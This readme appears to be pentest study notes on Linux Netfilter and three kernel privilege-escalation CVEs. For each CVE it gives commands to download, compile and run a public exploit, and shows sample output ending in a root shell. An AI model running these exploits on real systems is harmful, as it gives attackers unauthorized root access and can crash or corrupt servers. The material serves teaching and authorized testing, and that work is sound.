readme.md


<a id="org3e301d2"></a>

## Netfilter

Netfilter is a vital Linux kernel module that plays a crucial role in managing network traffic by offering features like packet filtering, network address translation, and various tools for firewall configurations. It operates at the software layer within the Linux kernel and is responsible for controlling and regulating network data flows by manipulating individual packets according to predefined rules. When network packets are received or sent, Netfilter triggers the execution of other modules, such as packet filters, which can intercept and modify packets. Key components like iptables and arptables are used as action mechanisms within the Netfilter hook system for both IPv4 and IPv6 protocol stacks.

This kernel module serves three primary functions:

1.  `Packet Defragmentation`: Netfilter handles the reassembly of fragmented IP packets before they are forwarded to their intended applications.

2.  `Connection Tracking`: It maintains a record of active connections, which is essential for stateful packet inspection, a common feature in firewalls.

3.  `Network Address Translation (NAT)`: Netfilter allows the translation of private IP addresses to public ones and vice versa, facilitating the routing of traffic between internal networks and the internet.

However, despite its crucial role in network security and routing, Netfilter has faced security vulnerabilities in recent years. In 2021 (CVE-2021-22555), 2022 (CVE-2022-1015), and 2023 (CVE-2023-32233), several vulnerabilities were discovered that had the potential to lead to privilege escalation. This underscores the importance of keeping the software and systems updated to mitigate such risks.

For many organizations, the challenge of maintaining and updating Linux distributions can be significant. Companies often use preconfigured Linux distributions tailored to their specific software applications or vice versa. This configuration provides a stable foundation that can be challenging to replace or update. Adapting an entire system to a new software application or vice versa can be a time-consuming and resource-intensive process, particularly for large and complex applications. This is one reason why many companies continue to run older, possibly unsupported, Linux distributions in production environments.

Even when organizations use virtualization technologies like virtual machines or containers (e.g., Docker) to isolate their applications from the underlying host system, the kernel plays a crucial role. While isolation is a positive step for security, there are various methods to escape from such containers, and security must be maintained at multiple levels to ensure a robust defense against potential threats.


<a id="org27469d7"></a>

### CVE-2021-22555

**Vulnerable kernel versions: 2.6 - 5.11**

    wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    gcc -m32 -static exploit.c -o exploit
    ./exploit
    
    [+] Linux Privilege Escalation by theflow@ - 2021
    
    [+] STAGE 0: Initialization
    [*] Setting up namespace sandbox...
    [*] Initializing sockets and message queues...
    
    [+] STAGE 1: Memory corruption
    [*] Spraying primary messages...
    [*] Spraying secondary messages...
    [*] Creating holes in primary messages...
    [*] Triggering out-of-bounds write...
    [*] Searching for corrupted primary message...
    [+] fake_idx: fff
    [+] real_idx: fdf
    
    ...SNIP...
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)


<a id="org957550a"></a>

### CVE-2022-25636

A recent vulnerability is CVE-2022-25636 and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write.

However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.

    git clone https://github.com/Bonfee/CVE-2022-25636.git
    cd CVE-2022-25636
    make
    ./exploit
    
    [*] STEP 1: Leak child and parent net_device
    [+] parent net_device ptr: 0xffff991285dc0000
    [+] child  net_device ptr: 0xffff99128e5a9000
    
    [*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
    [+] net_device struct freed
    
    [*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
    [+] obtained net_device struct
    
    [*] STEP 4: Leak kaslr
    [*] kaslr leak: 0xffffffff823093c0
    [*] kaslr base: 0xffffffff80ffefa0
    
    [*] STEP 5: Release setxattrs, free net_device, and realloc it again
    [+] obtained net_device struct
    
    [*] STEP 6: rop :)
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)


<a id="org3579acb"></a>

### CVE-2023-32233

This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temprorary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.

<span class="underline">Proof-Of-Concept</span>

    git clone https://github.com/Liuk3r/CVE-2023-32233
    cd CVE-2023-32233
    gcc -Wall -o exploit exploit.c -lmnl -lnftnl

<span class="underline">Exploitation</span>

    ./exploit
    
    [*] Netfilter UAF exploit
    
    Using profile:
    ========
    1                   race_set_slab                   # {0,1}
    1572                race_set_elem_count             # k
    4000                initial_sleep                   # ms
    100                 race_lead_sleep                 # ms
    600                 race_lag_sleep                  # ms
    100                 reuse_sleep                     # ms
    39d240              free_percpu                     # hex
    2a8b900             modprobe_path                   # hex
    23700               nft_counter_destroy             # hex
    347a0               nft_counter_ops                 # hex
    a                   nft_counter_destroy_call_offset # hex
    ffffffff            nft_counter_destroy_call_mask   # hex
    e8e58948            nft_counter_destroy_call_check  # hex
    ========
    
    [*] Checking for available CPUs...
    [*] sched_getaffinity() => 0 2
    [*] Reserved CPU 0 for PWN Worker
    [*] Started cpu_spinning_loop() on CPU 1
    [*] Started cpu_spinning_loop() on CPU 2
    [*] Started cpu_spinning_loop() on CPU 3
    [*] Creating "/tmp/modprobe"...
    [*] Creating "/tmp/trigger"...
    [*] Updating setgroups...
    [*] Updating uid_map...
    [*] Updating gid_map...
    [*] Signaling PWN Worker...
    [*] Waiting for PWN Worker...
    
    ...SNIP...
    
    [*] You've Got ROOT:-)
    
    # id
    
    uid=0(root) gid=0(root) groups=0(root)	

Please keep in mind that these exploits can be very unstable and can break the system.
